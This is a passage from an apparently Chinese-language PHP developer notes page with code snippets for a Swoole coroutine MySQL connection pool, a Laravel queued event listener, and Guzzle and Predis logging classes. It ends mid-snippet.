<h3 id="基于-swoole-协程的-MySQL-连接池"><a href="#基于-swoole-协程的-MySQL-连接池" class="headerlink" title="基于 swoole 协程的 MySQL 连接池"></a>基于 swoole 协程的 MySQL 连接池</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Created by PhpStorm</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Date: 19-1-4 上午9:42 https://laravel-china.org/articles/21979</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: woann &lt;304550409@qq.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MysqlPool</span></span>&#123;</span><br><span class="line">    private $pool;      <span class="comment">//连接池容器</span></span><br><span class="line">    public <span class="keyword">static</span> $instance = <span class="literal">null</span>;  <span class="comment">//实例</span></span><br><span class="line">    private $config = [</span><br><span class="line">        <span class="string">'max_num'</span>   =&gt; <span class="number">100</span>,</span><br><span class="line">        <span class="string">'host'</span>      =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'port'</span>      =&gt; <span class="number">3306</span>,</span><br><span class="line">        <span class="string">'user'</span>      =&gt; <span class="string">'user'</span>,</span><br><span class="line">        <span class="string">'password'</span>  =&gt; <span class="string">'password'</span>,</span><br><span class="line">        <span class="string">'database'</span>  =&gt; <span class="string">'dbname'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="comment">//防止手欠在外部实例化，将构造函数私有化</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @author woann&lt;304550409@qq.com&gt;</span></span><br><span class="line"><span class="comment">     * @des 初始化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;pool = <span class="keyword">new</span> chan($<span class="keyword">this</span>-&gt;config[<span class="string">"max_num"</span>]);<span class="comment">//用channel来作为连接池容器</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $<span class="keyword">this</span>-&gt;config[<span class="string">"max_num"</span>]; $i++) &#123;</span><br><span class="line">            $mysql = <span class="keyword">new</span> Swoole\Coroutine\MySQL();</span><br><span class="line">            $res = $mysql-&gt;connect([</span><br><span class="line">                <span class="string">'host'</span> =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">                <span class="string">'port'</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">                <span class="string">'user'</span> =&gt; <span class="string">'root'</span>,</span><br><span class="line">                <span class="string">'password'</span> =&gt; <span class="string">'wqg951122'</span>,</span><br><span class="line">                <span class="string">'database'</span> =&gt; <span class="string">'test'</span>,</span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">if</span> ($res == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"failed to connect mysql server"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;release($mysql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @author woann&lt;304550409@qq.com&gt;</span></span><br><span class="line"><span class="comment">     * @return MysqlPool|null</span></span><br><span class="line"><span class="comment">     * @des 获取连接池实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> public <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (self::$instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            $mysqlpool = <span class="keyword">new</span> MysqlPool();</span><br><span class="line">            $mysqlpool-&gt;init();</span><br><span class="line">            self::$instance = $mysqlpool;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self::$instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @author woann&lt;304550409@qq.com&gt;</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     * @des 获取链接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;pool-&gt;pop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @author woann&lt;304550409@qq.com&gt;</span></span><br><span class="line"><span class="comment">     * @param $mysql</span></span><br><span class="line"><span class="comment">     * @des 回收链接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">release</span>(<span class="params">$mysql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;pool-&gt;push($mysql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">require_once <span class="string">"MysqlPool.php"</span>;<span class="comment">//引入连接池类</span></span><br><span class="line"></span><br><span class="line">$server = <span class="keyword">new</span> Swoole\Http\Server(<span class="string">"127.0.0.1"</span>, <span class="number">9501</span>);<span class="comment">//创建httpserver</span></span><br><span class="line"></span><br><span class="line">$server-&gt;set([</span><br><span class="line">    <span class="string">'worker_num'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$request, $response</span>) </span>&#123;</span><br><span class="line">    $pool = MysqlPool::getInstance();<span class="comment">//获取连接池实例</span></span><br><span class="line">    $conn = $pool-&gt;get();<span class="comment">//获取链接</span></span><br><span class="line">    $stmt = $conn-&gt;prepare(<span class="string">'SELECT * FROM usertb WHERE id = ?'</span>); <span class="comment">//预处理</span></span><br><span class="line">    <span class="keyword">if</span> ($stmt == <span class="literal">false</span>) &#123;</span><br><span class="line">        var_dump($conn-&gt;errno, $conn-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line">    $res = $stmt-&gt;execute(array(<span class="number">9988</span>));<span class="comment">//绑定参数 执行sql</span></span><br><span class="line">    $pool-&gt;release($conn);<span class="comment">//释放回收链接</span></span><br><span class="line">    $response-&gt;end(json_encode($res));<span class="comment">//将查询结果转成json格式输出到浏览器</span></span><br><span class="line">&#125;);</span><br><span class="line">$server-&gt;start();</span><br></pre></td></tr></table></figure>
<p><a href="https://laravel-china.org/articles/21938#a30e76" target="_blank" rel="noopener">Linux 笔记分享四：Shell 基础</a></p>
<p><a href="http://www.helpergarden.com/2017/10/redis%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4key.html" target="_blank" rel="noopener">redis批量删除key</a></p>
<p><a href="https://mp.weixin.qq.com/s/Sn7V27O77moGCLOpFzEKqg" target="_blank" rel="noopener">程序员的数学笔记1–进制转换</a></p>
<h3 id="laravel-事件指定队列"><a href="#laravel-事件指定队列" class="headerlink" title="laravel 事件指定队列"></a>laravel 事件指定队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//laravel-china.org/articles/15338/laravel50-event-specifies-queue-names</span></span><br><span class="line">https:<span class="comment">//www.jiangxianli.com/?p=68</span></span><br><span class="line">protected $listen = [</span><br><span class="line">    <span class="string">'Shark\Events\Product\StockChangeEvent'</span> =&gt; [</span><br><span class="line">        <span class="string">'Shark\Listeners\Product\StockChangeListener'</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'Shark\Events\Product\ProductAddEvent'</span> =&gt; [</span><br><span class="line">        <span class="string">'Shark\Listeners\Product\ProductListener'</span>,</span><br><span class="line">        <span class="string">'Shark\Listeners\Product\ProductAddListener'</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br><span class="line">Event::fire(<span class="keyword">new</span> StockChangeEvent(<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line"><span class="comment">//event(new StockChangeEvent(1, 1));</span></span><br><span class="line">namespace app\Handlers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Queue\InteractsWithQueue;</span><br><span class="line">use Illuminate\Contracts\Queue\ShouldBeQueued;</span><br><span class="line">use app\UpdateUserMessageEvent;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateUserMessageHandler</span> <span class="title">implements</span> <span class="title">ShouldBeQueued</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    use InteractsWithQueue;</span><br><span class="line">    <span class="comment">// 将事件监听推送到指定队列执行</span></span><br><span class="line">    public $queue = <span class="string">'example'</span>;</span><br><span class="line">    <span class="comment">// 延时执行时间</span></span><br><span class="line">    public $delay = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create the event handler.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the event.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  App\UpdateUserMessageEvent  $event</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">UpdateUserMessageEvent $event</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $event-&gt;update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">queue</span>(<span class="params">$queue, $job, $data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">          dump($job, $data,$<span class="keyword">this</span>-&gt;queue,$<span class="keyword">this</span>-&gt;delay);<span class="comment">//Illuminate\Events\CallQueuedHandler@call</span></span><br><span class="line">            dump($data);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            array:3 [</span></span><br><span class="line"><span class="comment">  "class" =&gt; "app\Handlers\UpdateUserMessageHandler"</span></span><br><span class="line"><span class="comment">  "method" =&gt; "handle"</span></span><br><span class="line"><span class="comment">  "data" =&gt; "a:1:&#123;i:0;O:44:"app\UpdateUserMessageEvent":1:&#123;s:7:"@*@uids";a:2:&#123;i:0;s:4:"5656";i:1;s:4:"8888";&#125;&#125;&#125;"</span></span><br><span class="line"><span class="comment">]</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">     dump($<span class="keyword">this</span>-&gt;queue,$<span class="keyword">this</span>-&gt;delay);<span class="comment">//example 5</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;queue, $<span class="keyword">this</span>-&gt;delay)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $queue-&gt;laterOn($<span class="keyword">this</span>-&gt;queue, $<span class="keyword">this</span>-&gt;delay, $job, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;queue)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $queue-&gt;pushOn($<span class="keyword">this</span>-&gt;queue, $job, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;delay)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $queue-&gt;later($<span class="keyword">this</span>-&gt;delay, $job, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $queue-&gt;push($job, $data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="记录guzzle"><a href="#记录guzzle" class="headerlink" title="记录guzzle"></a>记录guzzle</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Services;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use GuzzleHttp\Event\EmitterInterface;</span><br><span class="line">use GuzzleHttp\Event\BeforeEvent;</span><br><span class="line">use GuzzleHttp\Event\CompleteEvent;</span><br><span class="line">use GuzzleHttp\Event\EndEvent;</span><br><span class="line">use GuzzleHttp\Event\Emitter;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuzzleEmitter</span> <span class="keyword">extends</span> <span class="title">Emitter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$rs_info = <span class="string">'api_time'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $start = <span class="number">0</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'before'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">BeforeEvent $event, $name</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            $start = microtime(<span class="literal">true</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">EndEvent $event</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($event-&gt;getException()) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;sysLog([<span class="string">'rs'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'url'</span>], <span class="string">'cmd'</span> =&gt; $event-&gt;getRequest()-&gt;getmethod(), <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>], <span class="string">'rs_info'</span> =&gt; $rs_info, <span class="string">'rs_type'</span> =&gt; <span class="number">1</span>, <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>), <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>], <span class="string">'msg'</span> =&gt; $event-&gt;getException()-&gt;getMessage()]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $method=$event-&gt;getRequest()-&gt;getmethod();</span><br><span class="line">                $post_data=($method==<span class="string">'POST'</span>)?((string)$event-&gt;getRequest()-&gt;getBody()):<span class="string">''</span>;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;sysLog([</span><br><span class="line">                    <span class="string">'rs'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'url'</span>],</span><br><span class="line">                    <span class="string">'cmd'</span> =&gt; $method,</span><br><span class="line">                    <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>],</span><br><span class="line">                    <span class="string">'rs_info'</span> =&gt; $rs_info,</span><br><span class="line">                    <span class="string">'rs_type'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>),</span><br><span class="line">                    <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>],</span><br><span class="line">                    <span class="string">'rs_content'</span>=&gt;$post_data,</span><br><span class="line">                ]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">sysLog</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        openlog(<span class="string">'guzzle'</span>,LOG_PID|LOG_ODELAY,LOG_LOCAL7);</span><br><span class="line">                syslog(LOG_INFO,json_encode($data));</span><br><span class="line">                closelog();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="记录Redis"><a href="#记录Redis" class="headerlink" title="记录Redis"></a>记录Redis</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//基于predis</span></span><br><span class="line">namespace App\Services;</span><br><span class="line"></span><br><span class="line">use \Predis\Command\CommandInterface;</span><br><span class="line">use \Predis\Connection\StreamConnection;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLog</span> <span class="keyword">extends</span> <span class="title">StreamConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $tstart = <span class="number">0</span>;</span><br><span class="line">    private $debugBuffer = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;tstart = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        parent::connect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">storeDebug</span>(<span class="params">CommandInterface $command, $direction</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $firtsArg = $command-&gt;getArguments();</span><br><span class="line">        $timestamp = (microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;tstart) * <span class="number">1000</span>;</span><br><span class="line">        $log = [];</span><br><span class="line">        $log[<span class="string">'cmd'</span>] = $command-&gt;getId();</span><br><span class="line">        $log[<span class="string">'key'</span>] = isset($firtsArg) ?  $firtsArg  : <span class="string">' '</span>;</span><br><span class="line">        $log[<span class="string">'server'</span>] = <span class="string">"$direction $this"</span>;</span><br><span class="line">        $log[<span class="string">'time'</span>] = $timestamp;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;sysLog([<span class="string">'rs'</span> =&gt; trim($log[<span class="string">'server'</span>]), <span class="string">'cmd'</span> =&gt; $command-&gt;getId(), <span class="string">'rs_info'</span> =&gt; $log[<span class="string">'key'</span>], <span class="string">'rs_type'</span> =&gt; <span class="number">2</span>, <span class="string">'t_total'</span> =&gt; $timestamp, <span class="string">'msg'</span> =&gt; [<span class="string">'host'</span> =&gt; explode(<span class="string">':'</span>, trim($log[<span class="string">'server'</span>]))[<span class="number">0</span>], <span class="string">'port'</span> =&gt; explode(<span class="string">':'</span>, trim($log[<span class="string">'server'</span>]))[<span class="number">1</span>]]]);</span><br><span class="line"><span class="comment">//        dump($log);</span></span><br><span class="line"><span class="comment">//        $this-&gt;debugBuffer[] = &amp;$log;</span></span><br><span class="line">        unset($log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">writeRequest</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::writeRequest($command);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        $this-&gt;storeDebug($command, '-&gt;');</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">readResponse</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = parent::readResponse($command);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;storeDebug($command, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDebugBuffer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;debugBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = array(</span><br><span class="line">            <span class="string">'connections'</span> =&gt;[</span><br><span class="line">                <span class="string">'tcp'</span> =&gt; <span class="string">'\App\Services\RedisLog'</span>,</span><br><span class="line">            ],</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $client = <span class="keyword">new</span> \Predis\Client(config(<span class="string">'database.redis.log'</span>), $options);</span><br><span class="line">        $client-&gt;get(<span class="string">'redis:debug:test'</span>);</span><br><span class="line"></span><br><span class="line">        var_export($client-&gt;getConnection());</span><br><span class="line">        <span class="comment">/* OUTPUT:</span></span><br><span class="line"><span class="comment">        array (</span></span><br><span class="line"><span class="comment">          0 =&gt; 'SELECT 15 -&gt; 127.0.0.1:6379 [0.0008s]',</span></span><br><span class="line"><span class="comment">          1 =&gt; 'SELECT 15 &lt;- 127.0.0.1:6379 [0.001s]',</span></span><br><span class="line"><span class="comment">          2 =&gt; 'SET foo -&gt; 127.0.0.1:6379 [0.001s]',</span></span><br><span class="line"><span class="comment">          3 =&gt; 'SET foo &lt;- 127.0.0.1:6379 [0.0011s]',</span></span><br><span class="line"><span class="comment">          4 =&gt; 'GET foo -&gt; 127.0.0.1:6379 [0.0013s]',</span></span><br><span class="line"><span class="comment">          5 =&gt; 'GET foo &lt;- 127.0.0.1:6379 [0.0015s]',</span></span><br><span class="line"><span class="comment">          6 =&gt; 'INFO -&gt; 127.0.0.1:6379 [0.0019s]',</span></span><br><span class="line"><span class="comment">          7 =&gt; 'INFO &lt;- 127.0.0.1:6379 [0.0022s]',</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span 